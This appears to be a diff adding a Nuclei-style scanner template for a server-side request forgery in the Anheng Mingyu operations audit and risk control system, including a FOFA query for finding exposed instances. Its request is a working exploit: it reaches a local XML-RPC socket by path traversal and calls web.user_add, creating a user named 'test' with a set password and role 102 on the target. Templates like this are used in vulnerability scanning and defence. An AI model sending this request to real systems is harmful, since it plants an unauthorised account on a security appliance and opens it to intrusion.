@@ -1,0 +1,111 @@
+id: anheng-mingyu-xmlrpc-sock-ssrf
+
+info:
+  name: Anheng Mingyu xmlrpc.sock - Server-Side Request Forgery
+  author: Co5mos
+  severity: critical
+  description: Anheng Mingyu xmlrpc.sock has a server-side request forgery vulnerability.
+  metadata:
+    max-request: 2
+    fofa-query: app="明御运维审计与风险控制系统"
+  tags: anheng,ssrf
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc"
+
+    body: |
+      <?xml version="1.0"?>  
+      <methodCall>
+      <methodName>web.user_add</methodName>
+      <params>
+      <param>
+      <value>
+      <array>
+      <data>
+      <value>
+      <string>admin</string>
+      </value>
+      <value>
+      <string>5</string>
+      </value>
+      <value>
+      <string>10.0.0.1</string>
+      </value>
+      </data>
+      </array>
+      </value>
+      </param>
+      <param>
+      <value>
+      <struct>
+      <member>
+      <name>uname</name>
+      <value>
+      <string>test</string>
+      </value>
+      </member>
+      <member>
+      <name>name</name>
+      <value>
+      <string>test</string>
+      </value>
+      </member>
+      <member>
+      <name>pwd</name>
+      <value>
+      <string>1qaz@3edC12345</string>
+      </value>
+      </member>
+      <member>
+      <name>authmode</name>
+      <value>
+      <string>1</string>
+      </value>
+      </member>
+      <member>
+      <name>deptid</name>
+      <value>
+      <string></string>
+      </value>
+      </member>
+      <member>
+      <name>email</name>
+      <value>
+      <string></string>
+      </value>
+      </member>
+      <member>
+      <name>mobile</name>
+      <value>
+      <string></string>
+      </value>
+      </member>
+      <member>
+      <name>comment</name>
+      <value>
+      <string></string>
+      </value>
+      </member>
+      <member>
+      <name>roleid</name>
+      <value>
+      <string>102</string>
+      </value>
+      </member>
+      </struct></value>
+      </param>
+      </params>
+      </methodCall>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<methodResponse>"
+        part: body
+
+      - type: status
+        status:
+          - 200
